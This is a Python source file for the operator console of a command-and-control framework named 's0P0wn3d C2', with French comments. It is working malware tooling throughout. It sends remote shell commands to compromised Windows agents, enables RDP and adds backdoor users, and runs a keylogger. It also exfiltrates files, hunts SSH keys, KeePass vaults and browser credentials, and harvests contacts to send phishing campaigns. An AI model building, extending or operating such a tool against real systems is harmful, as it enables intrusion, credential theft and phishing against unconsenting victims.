#!/usr/bin/env python3
"""
s0P0wn3d C2 - Operator CLI
"""

import requests
import json
import time
import readline
import os
import sys
from datetime import datetime
from pathlib import Path

# Configuration
C2_URL = "http://192.168.64.13:8443"
LOG_DIR = Path("logs")
LOG_FILE = LOG_DIR / f"cli_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

# Variables globales
current_agent = None
session_start = datetime.now()


def init_logs():
    """Initialise le système de logs"""
    LOG_DIR.mkdir(exist_ok=True)
    log(f"{'=' * 60}")
    log(f"CLI Session Started - {session_start.strftime('%Y-%m-%d %H:%M:%S')}")
    log(f"{'=' * 60}")


def log(message):
    """Écrit dans le fichier de log"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] {message}\n")


def print_banner():
    """Affiche le banner du C2"""
    banner = """
╔═══════════════════════════════════════════════════════════╗
║              s0P0wn3d C2 - Operator CLI                  ║
║                   Version 1.0 - MVP                       ║
╚═══════════════════════════════════════════════════════════╝
"""
    print(banner)
    print(f"[*] Server: {C2_URL}")
    print(f"[*] Logs: {LOG_FILE}")
    print(f"[*] Type 'help' for available commands\n")
    log("Banner displayed")


def format_time_ago(dt):
    """Formate un datetime en 'X ago'"""
    now = datetime.now()
    diff = now - dt

    seconds = diff.total_seconds()

    if seconds < 60:
        return f"{int(seconds)}s ago"
    elif seconds < 3600:
        return f"{int(seconds / 60)}m ago"
    elif seconds < 86400:
        return f"{int(seconds / 3600)}h ago"
    else:
        return f"{int(seconds / 86400)}d ago"


def draw_table(headers, rows):
    """Dessine un tableau ASCII simple"""
    if not rows:
        return "No data"

    # Calculer les largeurs de colonnes
    col_widths = [len(h) for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            col_widths[i] = max(col_widths[i], len(str(cell)))

    # Ligne du haut
    table = "┌"
    for width in col_widths:
        table += "─" * (width + 2) + "┬"
    table = table[:-1] + "┐\n"

    # Headers
    table += "│"
    for i, header in enumerate(headers):
        table += f" {header:<{col_widths[i]}} │"
    table += "\n"

    # Séparateur
    table += "├"
    for width in col_widths:
        table += "─" * (width + 2) + "┼"
    table = table[:-1] + "┤\n"

    # Lignes
    for row in rows:
        table += "│"
        for i, cell in enumerate(row):
            table += f" {str(cell):<{col_widths[i]}} │"
        table += "\n"

    # Ligne du bas
    table += "└"
    for width in col_widths:
        table += "─" * (width + 2) + "┴"
    table = table[:-1] + "┘"

    return table


def cmd_agents():
    """Liste tous les agents connectés"""
    try:
        log("Command: agents")
        response = requests.get(f"{C2_URL}/agents", timeout=5)
        data = response.json()

        agents = data.get("agents", {})

        if not agents:
            print("[!] No active agents")
            log("No agents found")
            return

        # Préparer les données pour le tableau
        headers = ["Agent ID", "Hostname", "Username", "OS", "Last Seen"]
        rows = []

        for agent_id, info in agents.items():
            last_seen = datetime.fromisoformat(info['last_seen'].replace('Z', '+00:00'))
            rows.append([
                agent_id,
                info.get('hostname', 'N/A'),
                info.get('username', 'N/A'),
                info.get('os', 'N/A'),
                format_time_ago(last_seen)
            ])

        print(f"\n[Active Agents: {len(agents)}]")
        print(draw_table(headers, rows))
        print()

        log(f"Listed {len(agents)} agent(s)")

    except requests.exceptions.RequestException as e:
        print(f"[-] Error connecting to server: {e}")
        log(f"ERROR: {e}")
    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_use(agent_id):
    """Sélectionne un agent"""
    global current_agent

    if not agent_id:
        print("[-] Usage: use <agent_id>")
        return

    # Vérifier que l'agent existe
    try:
        response = requests.get(f"{C2_URL}/agents", timeout=5)
        data = response.json()
        agents = data.get("agents", {})

        if agent_id not in agents:
            print(f"[-] Agent '{agent_id}' not found")
            print("[*] Use 'agents' to list available agents")
            log(f"Attempted to use non-existent agent: {agent_id}")
            return

        current_agent = agent_id
        print(f"[+] Selected agent: {agent_id}")
        log(f"Selected agent: {agent_id}")

    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_shell(command):
    """Envoie une commande shell à l'agent sélectionné"""
    if not current_agent:
        print("[-] No agent selected. Use 'use <agent_id>' first")
        return

    if not command:
        print("[-] Usage: shell <command>")
        return

    try:
        payload = {
            "agent_id": current_agent,
            "type": "shell",
            "command": command
        }

        log(f"Sending command to {current_agent}: {command}")

        response = requests.post(
            f"{C2_URL}/command",
            json=payload,
            timeout=5
        )

        if response.status_code == 200:
            print(f"[+] Command queued for {current_agent}")
            print(f"[*] Command: {command}")
            log(f"Command queued successfully")

            # Auto-attendre et afficher les résultats
            wait_for_results(current_agent, timeout=10, poll_interval=2)
        else:
            print(f"[-] Server error: {response.status_code}")
            log(f"ERROR: Server returned {response.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_rdp(args):
    """Commande RDP : activer/désactiver Remote Desktop"""
    if not current_agent:
        print("[-] No agent selected. Use 'use <agent_id>' first")
        return

    if not args:
        print("[-] Usage: rdp <enable|disable|status|adduser <user> <pass>>")
        print("[*] Examples:")
        print("    rdp enable          # Enable RDP on target")
        print("    rdp disable         # Disable RDP")
        print("    rdp status          # Check RDP status")
        print("    rdp adduser alice P@ssw0rd  # Create RDP user")
        return

    try:
        payload = {
            "agent_id": current_agent,
            "type": "shell",
            "command": f"rdp {args}"
        }

        log(f"Sending RDP command to {current_agent}: rdp {args}")

        response = requests.post(
            f"{C2_URL}/command",
            json=payload,
            timeout=5
        )

        if response.status_code == 200:
            print(f"[+] RDP command queued for {current_agent}")
            print(f"[*] Command: rdp {args}")
            log(f"RDP command queued successfully")

            # Auto-attendre et afficher les résultats
            wait_for_results(current_agent, timeout=10, poll_interval=2)
        else:
            print(f"[-] Server error: {response.status_code}")
            log(f"ERROR: Server returned {response.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_keylog(args):
    """Commande Keylog : capturer les frappes clavier"""
    if not current_agent:
        print("[-] No agent selected. Use 'use <agent_id>' first")
        return

    if not args:
        print("[-] Usage: keylog <start|stop|dump|status>")
        print("[*] Examples:")
        print("    keylog start    # Start keystroke capture")
        print("    keylog stop     # Stop keystroke capture")
        print("    keylog dump     # Retrieve captured keystrokes")
        print("    keylog status   # Check keylogger status")
        return

    try:
        payload = {
            "agent_id": current_agent,
            "type": "shell",
            "command": f"keylog {args}"
        }

        log(f"Sending keylog command to {current_agent}: keylog {args}")

        response = requests.post(
            f"{C2_URL}/command",
            json=payload,
            timeout=5
        )

        if response.status_code == 200:
            print(f"[+] Keylog command queued for {current_agent}")
            print(f"[*] Command: keylog {args}")
            log(f"Keylog command queued successfully")

            # Auto-attendre et afficher les résultats
            wait_for_results(current_agent, timeout=10, poll_interval=2)
        else:
            print(f"[-] Server error: {response.status_code}")
            log(f"ERROR: Server returned {response.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_loot(args):
    """Commande Loot : exfiltration de données sensibles"""
    if not current_agent:
        print("[-] No agent selected. Use 'use <agent_id>' first")
        return

    if not args:
        print("[-] Usage: loot <sysinfo|find <pattern>|grab <file>|browser>")
        print("[*] Examples:")
        print("    loot sysinfo        # Collect system information")
        print("    loot find *.txt     # Search for text files")
        print("    loot grab C:\\file.txt # Exfiltrate a file (base64)")
        print("    loot browser        # Find browser data locations")
        return

    try:
        payload = {
            "agent_id": current_agent,
            "type": "shell",
            "command": f"loot {args}"
        }

        log(f"Sending loot command to {current_agent}: loot {args}")

        response = requests.post(
            f"{C2_URL}/command",
            json=payload,
            timeout=5
        )

        if response.status_code == 200:
            print(f"[+] Loot command queued for {current_agent}")
            print(f"[*] Command: loot {args}")
            log(f"Loot command queued successfully")

            # Auto-attendre et afficher les résultats (timeout plus long pour find/grab)
            wait_for_results(current_agent, timeout=15, poll_interval=2)
        else:
            print(f"[-] Server error: {response.status_code}")
            log(f"ERROR: Server returned {response.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def wait_for_results(agent_id, timeout=10, poll_interval=2):
    """
    Attend et affiche automatiquement les nouveaux résultats

    Args:
        agent_id: ID de l'agent cible
        timeout: Temps max d'attente en secondes
        poll_interval: Intervalle entre chaque vérification

    Returns:
        True si des résultats ont été trouvés, False sinon
    """
    print(f"[*] Waiting for results (max {timeout}s)...", end="", flush=True)

    # Obtenir le nombre actuel de résultats
    try:
        response = requests.get(f"{C2_URL}/results/{agent_id}", timeout=5)
        initial_count = 0
        if response.status_code == 200:
            data = response.json()
            initial_count = len(data.get("results", []))
    except:
        initial_count = 0

    # Polling avec timeout
    start_time = time.time()
    while (time.time() - start_time) < timeout:
        try:
            response = requests.get(f"{C2_URL}/results/{agent_id}", timeout=5)

            if response.status_code == 200:
                data = response.json()
                results_list = data.get("results", [])

                # Vérifier si de nouveaux résultats sont arrivés
                if len(results_list) > initial_count:
                    print("\r[+] Results received!                    ")

                    # Afficher seulement les nouveaux résultats
                    new_results = results_list[initial_count:]

                    print(f"\n{'=' * 70}")
                    print(f"[Command Output]")
                    print(f"{'=' * 70}\n")

                    for result in new_results:
                        timestamp = result.get('timestamp', 'N/A')
                        command = result.get('command', 'N/A')
                        output = result.get('output', '')

                        print(f"[{timestamp}]")
                        print(f"Command: {command}")
                        print(f"Output:")
                        for line in output.split('\n'):
                            print(f"  {line}")

                    print(f"{'=' * 70}\n")
                    log(f"Auto-displayed result for command on {agent_id}")
                    return True

            # Afficher un point pour indiquer que ça tourne
            print(".", end="", flush=True)
            time.sleep(poll_interval)

        except Exception as e:
            log(f"ERROR during wait_for_results: {e}")
            break

    # Timeout atteint
    print(f"\r[-] Timeout reached. Use 'results' to check manually.                    ")
    log(f"Timeout waiting for results from {agent_id}")
    return False


def cmd_results(agent_id=None, auto_wait=False):
    """Affiche les résultats des commandes"""
    target = agent_id if agent_id else current_agent

    if not target:
        print("[-] No agent selected. Use 'use <agent_id>' or 'results <agent_id>'")
        return

    try:
        log(f"Requesting results for {target}")
        response = requests.get(f"{C2_URL}/results/{target}", timeout=5)

        if response.status_code == 404:
            if auto_wait:
                print(f"[-] No results yet for {target}. Waiting for agent beacon...")
                return
            print(f"[-] No results found for {target}")
            log(f"No results for {target}")
            return

        data = response.json()
        results_list = data.get("results", [])

        if not results_list:
            if auto_wait:
                print(f"[-] No results yet for {target}. Waiting for agent beacon...")
                return
            print(f"[-] No results yet for {target}")
            log(f"No results for {target}")
            return

        print(f"\n{'=' * 70}")
        print(f"[Results for {target}] - {len(results_list)} command(s)")
        print(f"{'=' * 70}\n")

        for i, result in enumerate(results_list, 1):
            timestamp = result.get('timestamp', 'N/A')
            command = result.get('command', 'N/A')
            output = result.get('output', '')

            print(f"[{i}] {timestamp}")
            print(f"┌─ Command: {command}")
            print(f"└─ Output:")
            # Indenter l'output pour plus de clarté
            for line in output.split('\n'):
                print(f"   {line}")
            print(f"{'-' * 70}\n")

        log(f"Displayed {len(results_list)} result(s) for {target}")

    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_phish(args):
    """Phish : recon, contacts, envoi test ou campagne"""
    if not current_agent:
        print("[-] No agent selected. Use 'use <agent_id>' first")
        return

    # Construire la commande ("phish" seul = recon mode sur l'agent)
    command = f"phish {args}".strip()

    try:
        payload = {
            "agent_id": current_agent,
            "type": "shell",
            "command": command
        }

        log(f"Sending phish command to {current_agent}: {command}")

        response = requests.post(
            f"{C2_URL}/command",
            json=payload,
            timeout=5
        )

        if response.status_code == 200:
            print(f"[+] Command queued: {command}")
            log(f"Phish command queued successfully")
            # Campaign peut prendre plus de temps (envoi multiple)
            timeout = 30 if "campaign" in args else 15
            wait_for_results(current_agent, timeout=timeout, poll_interval=2)
        else:
            print(f"[-] Server error: {response.status_code}")
            log(f"ERROR: Server returned {response.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")
        log(f"ERROR: {e}")


def cmd_clear():
    """Efface l'écran"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()


def cmd_watch():
    """Surveille les résultats en temps réel"""
    if not current_agent:
        print("[-] No agent selected. Use 'use <agent_id>' first")
        return

    print(f"[*] Watching results for {current_agent}...")
    print(f"[*] Press Ctrl+C to stop\n")

    last_count = 0

    try:
        while True:
            response = requests.get(f"{C2_URL}/results/{current_agent}", timeout=5)

            if response.status_code == 200:
                data = response.json()
                results_list = data.get("results", [])

                # Afficher seulement les nouveaux résultats
                if len(results_list) > last_count:
                    for result in results_list[last_count:]:
                        timestamp = result.get('timestamp', 'N/A')
                        command = result.get('command', 'N/A')
                        output = result.get('output', '')

                        print(f"\n{'=' * 70}")
                        print(f"[NEW] {timestamp}")
                        print(f"┌─ Command: {command}")
                        print(f"└─ Output:")
                        for line in output.split('\n'):
                            print(f"   {line}")
                        print(f"{'=' * 70}\n")

                    last_count = len(results_list)

            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[*] Stopped watching")
        log("Watch mode stopped")


def cmd_help():
    """Affiche l'aide"""
    help_text = """
Available Commands:
──────────────────────────────────────────────────────────
  agents              List all connected agents
  use <agent_id>      Select an agent to interact with
  shell <command>     Execute shell command on selected agent
  rdp <args>          Manage Remote Desktop on selected agent
  keylog <args>       Capture keystrokes on selected agent
  loot <args>         Exfiltrate data and search for files
  phish [args]        Email recon or test email sender
  results [agent_id]  Show command results (current or specified agent)
  watch               Auto-refresh results in real-time (Ctrl+C to stop)
  clear               Clear screen
  help                Show this help message
  exit                Exit the CLI

Examples:
──────────────────────────────────────────────────────────
  agents                    # List all agents
  use WIN_25653CD9          # Select agent WIN_25653CD9
  shell whoami              # Run 'whoami' on selected agent
  shell dir C:\\Users       # Run 'dir C:\\Users'
  rdp enable                # Enable RDP on target
  rdp status                # Check RDP status
  rdp adduser alice Pass123 # Create RDP user with password
  rdp disable               # Disable RDP
  keylog start              # Start keystroke capture
  keylog dump               # Retrieve captured keys
  keylog stop               # Stop capture
  loot sysinfo              # Collect system information
  loot browser              # Find browser data locations
  loot find *.txt           # Search for text files
  loot sensitive            # Hunt for KeePass, SSH keys, certs, .env...
  phish                     # Detect installed email clients (recon)
  phish contacts            # Extract contacts (Windows Contacts + Thunderbird)
  phish campaign smtp:25 from@email.com  # Send phishing emails to all contacts
  phish send localhost:2525 a@b.com a@b.com  # Send single test email
  results                   # Show results for current agent
  watch                     # Auto-refresh results every 2s
  results WIN_25653CD9      # Show results for specific agent

RDP Commands (require admin privileges):
──────────────────────────────────────────────────────────
  rdp enable                # Enable Remote Desktop (port 3389)
  rdp disable               # Disable Remote Desktop
  rdp status                # Check current RDP status
  rdp adduser <user> <pass> # Create user with RDP access

Keylog Commands (VERY suspicious):
──────────────────────────────────────────────────────────
  keylog start              # Start capturing keystrokes
  keylog stop               # Stop capturing keystrokes
  keylog dump               # Retrieve captured keystrokes
  keylog status             # Check keylogger status

Loot Commands (data exfiltration):
──────────────────────────────────────────────────────────
  loot sysinfo              # Collect system information
  loot find <pattern>       # Search for files (*.txt, password*, etc.)
  loot grab <filepath>      # Exfiltrate a file (base64 encoded)
  loot browser              # Find browser data locations (cookies, passwords)
  loot sensitive            # Hunt KeePass (.kdbx), SSH keys, .pem, .ovpn, .env...

Phish Commands (email recon + campaign):
──────────────────────────────────────────────────────────
  phish                     # Detect email clients (Outlook, Thunderbird, webmail)
  phish contacts            # Extract emails from Windows Contacts + Thunderbird abook
  phish campaign <smtp:port> <from@email>  # Send phishing emails to all contacts
  phish send <smtp:port> <from> <to>       # Send a single test email

Agent Control:
──────────────────────────────────────────────────────────
  shell exit                # Stop agent gracefully (no persistence removal)
  shell killme              # Stop agent + remove all persistence

Tips:
──────────────────────────────────────────────────────────
  - Use arrow keys (↑/↓) to navigate command history
  - All commands are logged to: {0}
  - Use 'watch' mode to see results as they arrive
  - RDP actions require admin privileges on target
  - Press Ctrl+C or type 'exit' to quit
""".format(LOG_FILE)

    print(help_text)
    log("Help displayed")


def cmd_exit():
    """Quitte la CLI"""
    log("CLI session ended")
    log(f"{'=' * 60}\n")
    print("\n[*] Goodbye!")
    sys.exit(0)


def get_prompt():
    """Retourne le prompt approprié"""
    if current_agent:
        return f"c2({current_agent})> "
    return "c2> "


def setup_readline():
    """Configure readline pour l'historique"""
    # Créer le fichier d'historique
    history_file = LOG_DIR / ".cli_history"

    try:
        readline.read_history_file(history_file)
    except FileNotFoundError:
        pass

    # Sauvegarder l'historique à la sortie
    import atexit
    atexit.register(readline.write_history_file, history_file)

    # Configurer l'auto-complétion (basique)
    readline.parse_and_bind("tab: complete")


def main():
    """Boucle principale de la CLI"""
    init_logs()
    setup_readline()
    print_banner()

    # Vérifier la connexion au serveur
    try:
        response = requests.get(f"{C2_URL}/", timeout=2)
        print("[+] Connected to C2 server")
        print("[!] IMPORTANT: Run server with 'python3 server.py' (silent mode)\n")
        log("Connected to C2 server")
    except Exception as e:
        print(f"[-] Cannot connect to C2 server: {e}")
        print(f"[*] Make sure the server is running on {C2_URL}")
        log(f"ERROR: Cannot connect to server: {e}")
        return

    # Boucle principale
    while True:
        try:
            user_input = input(get_prompt()).strip()

            if not user_input:
                continue

            # Parser la commande
            parts = user_input.split(maxsplit=1)
            cmd = parts[0].lower()
            args = parts[1] if len(parts) > 1 else ""

            # Router les commandes
            if cmd == "agents":
                cmd_agents()
            elif cmd == "use":
                cmd_use(args)
            elif cmd == "shell":
                cmd_shell(args)
            elif cmd == "rdp":
                cmd_rdp(args)
            elif cmd == "keylog":
                cmd_keylog(args)
            elif cmd == "loot":
                cmd_loot(args)
            elif cmd == "phish":
                cmd_phish(args)
            elif cmd == "results":
                cmd_results(args if args else None)
            elif cmd == "watch":
                cmd_watch()
            elif cmd == "clear":
                cmd_clear()
            elif cmd == "help":
                cmd_help()
            elif cmd in ["exit", "quit"]:
                cmd_exit()
            else:
                print(f"[-] Unknown command: {cmd}")
                print("[*] Type 'help' for available commands")
                log(f"Unknown command: {cmd}")

        except KeyboardInterrupt:
            print("\n[!] Use 'exit' to quit")
            log("Received Ctrl+C")
        except EOFError:
            cmd_exit()
        except Exception as e:
            print(f"[-] Error: {e}")
            log(f"ERROR: {e}")


if __name__ == "__main__":
    main()